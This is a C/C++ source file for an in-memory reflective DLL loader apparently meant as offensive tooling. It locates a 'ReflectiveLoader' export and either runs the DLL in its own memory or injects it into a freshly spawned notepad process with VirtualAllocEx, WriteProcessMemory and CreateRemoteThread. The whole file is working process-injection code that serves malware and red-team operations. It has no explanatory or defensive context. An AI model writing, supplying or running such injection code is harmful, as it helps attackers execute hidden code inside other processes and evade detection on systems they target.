#include <windows.h>
#include <stdio.h>

#define WIN_X64
#define DEREF_32( name )*(DWORD *)(name)
#define DEREF_16( name )*(WORD *)(name)

DWORD Rva2Offset(DWORD dwRva, UINT_PTR uiBaseAddress)
{
	WORD wIndex = 0;
	PIMAGE_SECTION_HEADER pSectionHeader = NULL;
	PIMAGE_NT_HEADERS pNtHeaders = NULL;

	pNtHeaders = (PIMAGE_NT_HEADERS)(uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)->e_lfanew);

	pSectionHeader = (PIMAGE_SECTION_HEADER)((UINT_PTR)(&pNtHeaders->OptionalHeader) + pNtHeaders->FileHeader.SizeOfOptionalHeader);

	if (dwRva < pSectionHeader[0].PointerToRawData)
		return dwRva;

	for (wIndex = 0; wIndex < pNtHeaders->FileHeader.NumberOfSections; wIndex++)
	{
		if (dwRva >= pSectionHeader[wIndex].VirtualAddress && dwRva < (pSectionHeader[wIndex].VirtualAddress + pSectionHeader[wIndex].SizeOfRawData))
			return (dwRva - pSectionHeader[wIndex].VirtualAddress + pSectionHeader[wIndex].PointerToRawData);
	}

	return 0;
}

DWORD GetReflectiveLoaderOffset(VOID* lpReflectiveDllBuffer)
{
	UINT_PTR uiBaseAddress = 0;
	UINT_PTR uiExportDir = 0;
	UINT_PTR uiNameArray = 0;
	UINT_PTR uiAddressArray = 0;
	UINT_PTR uiNameOrdinals = 0;
	DWORD dwCounter = 0;
#ifdef WIN_X64
	DWORD dwCompiledArch = 2;
#else
	// This will catch Win32 and WinRT.
	DWORD dwCompiledArch = 1;
#endif

	uiBaseAddress = (UINT_PTR)lpReflectiveDllBuffer;

	// get the File Offset of the modules NT Header
	uiExportDir = uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)->e_lfanew;

	// currenlty we can only process a PE file which is the same type as the one this fuction has
	// been compiled as, due to various offset in the PE structures being defined at compile time.
	if (((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.Magic == 0x010B) // PE32
	{
		if (dwCompiledArch != 1)
			return 0;
	}
	else if (((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.Magic == 0x020B) // PE64
	{
		if (dwCompiledArch != 2)
			return 0;
	}
	else
	{
		return 0;
	}

	// uiNameArray = the address of the modules export directory entry
	uiNameArray = (UINT_PTR) & ((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

	// get the File Offset of the export directory
	uiExportDir = uiBaseAddress + Rva2Offset(((PIMAGE_DATA_DIRECTORY)uiNameArray)->VirtualAddress, uiBaseAddress);

	// get the File Offset for the array of name pointers
	uiNameArray = uiBaseAddress + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfNames, uiBaseAddress);

	// get the File Offset for the array of addresses
	uiAddressArray = uiBaseAddress + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfFunctions, uiBaseAddress);

	// get the File Offset for the array of name ordinals
	uiNameOrdinals = uiBaseAddress + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfNameOrdinals, uiBaseAddress);

	// get a counter for the number of exported functions...
	dwCounter = ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->NumberOfNames;

	// loop through all the exported functions to find the ReflectiveLoader
	while (dwCounter--)
	{
		char* cpExportedFunctionName = (char*)(uiBaseAddress + Rva2Offset(DEREF_32(uiNameArray), uiBaseAddress));

		if (strstr(cpExportedFunctionName, "ReflectiveLoader") != NULL)
		{
			// get the File Offset for the array of addresses
			uiAddressArray = uiBaseAddress + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfFunctions, uiBaseAddress);

			// use the functions name ordinal as an index into the array of name pointers
			uiAddressArray += (DEREF_16(uiNameOrdinals) * sizeof(DWORD));

			// return the File Offset to the ReflectiveLoader() functions code...
			return Rva2Offset(DEREF_32(uiAddressArray), uiBaseAddress);
		}
		// get the next exported function name
		uiNameArray += sizeof(DWORD);

		// get the next exported function name ordinal
		uiNameOrdinals += sizeof(WORD);
	}

	return 0;
}

DWORD read_bytes_from_file(char* path, LPVOID* buf)
{
	HANDLE hFile;
	DWORD  size, readAmount = 0;

	hFile = CreateFileA(path, GENERIC_READ, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if (hFile != INVALID_HANDLE_VALUE) {
		size = GetFileSize(hFile, 0);
		*buf = malloc(size + 16);
		BOOL bRead = ReadFile(hFile, *buf, size, &readAmount, 0);
		if (bRead == FALSE)
		{
			readAmount = 0;
		}
		CloseHandle(hFile);
	}
	return readAmount;
}

void local_load_dll(DWORD bufSz, LPVOID buf)
{
	LPVOID pAddress = nullptr;
	BOOL bProtect = FALSE;
	HANDLE hThread = nullptr;
	DWORD lpflOldProtect = 0;
	DWORD dwLdrOffset = 0;
	LPTHREAD_START_ROUTINE pRoutine = nullptr;
	DWORD dwWait = NULL;

	pAddress = VirtualAlloc(nullptr, bufSz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pAddress == NULL)
	{
		return;
	}
	printf("  :: Base Address: %p\n", pAddress);

	RtlMoveMemory(pAddress, buf, bufSz);
	bProtect = VirtualProtect(pAddress, bufSz, PAGE_EXECUTE_READ, &lpflOldProtect);

	if (bProtect == FALSE)
	{
		printf("[!] Failed to set PAGE_EXECUTE_READ!\n");
		return;
	}
	printf("  :: Set PAGE_EXECUTE_READ\n");

	dwLdrOffset = GetReflectiveLoaderOffset(buf);

	if (dwLdrOffset == 0)
	{
		printf("[!] Failed to get Reflective Loader Offset!\n");
		return;
	}
	printf("  :: Loader Offset: %ld\n", dwLdrOffset);

	pRoutine = (LPTHREAD_START_ROUTINE)((ULONG_PTR)pAddress + dwLdrOffset);

	if (pRoutine == NULL)
	{
		return;
	}
	printf("  :: THREAD_START_ROUTINE: %p\n", pRoutine);

	hThread = CreateThread(0, 0, pRoutine, 0, 0, 0);
	if (hThread == NULL)
	{
		return;
	}
	printf("  :: Thread: %p\n", hThread);

	dwWait = WaitForSingleObject(hThread, INFINITE);
	if (dwWait != 0)
	{
		printf("[!] Something went wrong when waiting: %d\n", GetLastError());
		return;
	}
	printf("  :: Done!\n");
	return;
}

void remote_load_dll(DWORD bufSz, LPVOID buf)
{
	LPSTARTUPINFOA si = new STARTUPINFOA();
	PPROCESS_INFORMATION pi = new PROCESS_INFORMATION();

	BOOL bCreated = FALSE;
	BOOL bProtect = FALSE;
	BOOL bWritten = FALSE;
	LPVOID pAddress = nullptr;
	PTHREAD_START_ROUTINE pRoutine = nullptr;
	HANDLE hThread = nullptr;
	SIZE_T stWritten = 0;
	DWORD lpflOldProtect = 0;
	HMODULE hModule = nullptr;
	FARPROC pLoadLibraryA = nullptr;
	DWORD dwLdrOffset = 0;

	bCreated = CreateProcessA(NULL, (LPSTR)"\"notepad\"", NULL, NULL, TRUE, 0, NULL, NULL, si, pi);

	if (bCreated == FALSE)
	{
		printf("[!] Failed to create process!\n");
		goto Cleanup;
	}

	printf("  :: Process ID: %d\n", pi->dwProcessId);
	printf("  :: Process Handle: %p\n", pi->hProcess);

	pAddress = VirtualAllocEx(pi->hProcess, nullptr, bufSz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pAddress == NULL)
	{
		goto Cleanup;
	}

	printf("  :: Base Address: %p\n", pAddress);

	bWritten = WriteProcessMemory(pi->hProcess, pAddress, buf, bufSz, &stWritten);

	if (bWritten == FALSE)
	{
		printf("[!] Failed to write bytes!\n");
		goto Cleanup;
	}
	printf("  :: Bytes Written: %zd\n", stWritten);

	bProtect = VirtualProtectEx(pi->hProcess, pAddress, bufSz, PAGE_EXECUTE_READ, &lpflOldProtect);

	if (bProtect == FALSE)
	{
		printf("[!] Failed to set PAGE_EXECUTE_READ!\n");
		goto Cleanup;
	}

	printf("  :: Set PAGE_EXECUTE_READ\n");

	dwLdrOffset = GetReflectiveLoaderOffset(buf);

	if (dwLdrOffset == 0)
	{
		printf("[!] Failed to get Reflective Loader Offset!\n");
		return;
	}
	printf("  :: Loader Offset: %ld\n", dwLdrOffset);

	pRoutine = (LPTHREAD_START_ROUTINE)((ULONG_PTR)pAddress + dwLdrOffset);

	if (pRoutine == NULL)
	{
		goto Cleanup;
	}

	printf("  :: THREAD_START_ROUTINE: %p\n", pRoutine);

	hThread = CreateRemoteThread(pi->hProcess, NULL, 0, pRoutine, pAddress, 0, NULL);

	if (hThread == NULL)
	{
		goto Cleanup;
	}

	printf("  :: Thread: %p\n", hThread);

	printf("  :: Done!\n");
	goto Cleanup;

Cleanup:
	if (pi->hProcess)CloseHandle(pi->hProcess);
	if (pi->hThread)CloseHandle(pi->hThread);
	if (hThread)CloseHandle(hThread);
	return;
}

int main(int argc, char* argv[])
{
	char* path;
	int mode = 0;

	if (argc == 3)
	{
		mode = atoi(argv[1]);
		path = argv[2];
	}
	else
	{
		printf("PS> .\\in-mem-loader.exe <mode> <path>\n");
		printf("PS> .\\in-mem-loader.exe 1 c:\\file.dll\n");
		printf("PS> .\\in-mem-loader.exe 2 c:\\file.dll\n");
		printf("\nMODES:\n");
		printf("    - 1: Local\n");
		printf("    - 2: Remote\n");
		return -1;
	}

	printf("|> Loading: %s\n", path);

	LPVOID buf;
	DWORD bufSz = read_bytes_from_file(path, &buf);

	if (bufSz == 0)
	{
		printf("[!] Failed to read bytes from file!\n");
		return -1;
	}

	switch (mode)
	{
	case 1:
		printf("|> Loading Locally!\n");
		local_load_dll(bufSz, buf);
		break;
	case 2:
		printf("|> Loading Remotely!\n");
		remote_load_dll(bufSz, buf);
		break;
	}

	return 0;
}